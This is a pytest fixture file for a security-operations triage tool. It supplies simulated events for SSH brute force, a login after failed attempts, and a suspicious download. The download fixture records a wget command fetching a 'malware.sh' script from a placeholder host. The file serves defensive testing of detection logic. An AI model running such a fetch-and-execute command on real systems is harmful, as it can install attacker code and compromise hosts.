"""
conftest.py
Pytest fixtures and environment setup for SOC Triage tests.
"""

import sys
from pathlib import Path

import pytest

# Ensure triage directory is in Python path for tests
triage_dir = Path(__file__).parent.parent / "triage"
if str(triage_dir) not in sys.path:
    sys.path.insert(0, str(triage_dir))


@pytest.fixture
def sample_t1110_event():
    return {
        "_time": "2026-07-27T10:00:00Z",
        "host": "ip-172-31-13-183",
        "src_ip": "72.255.58.137",
        "user": "ubuntu",
        "failed_attempts": "36",
    }


@pytest.fixture
def sample_t1078_event():
    return {
        "_time": "2026-07-27T10:05:00Z",
        "host": "ip-172-31-13-183",
        "src_ip": "72.255.58.137",
        "user": "ubuntu",
        "prior_failed_attempts": "35",
        "status": "accepted",
    }


@pytest.fixture
def sample_t1059_event():
    return {
        "_time": "2026-07-27T10:06:00Z",
        "host": "ip-172-31-13-183",
        "command": "wget",
        "arg1": "http://example.com/malware.sh",
    }


@pytest.fixture
def sample_raw_detections(sample_t1110_event, sample_t1078_event, sample_t1059_event):
    return {
        "T1110": {
            "name": "SSH Brute Force Detected",
            "events": [sample_t1110_event],
        },
        "T1078": {
            "name": "Successful Login Following Failed Attempts",
            "events": [sample_t1078_event],
        },
        "T1059": {
            "name": "Suspicious Download Utility Execution",
            "events": [sample_t1059_event],
        },
    }
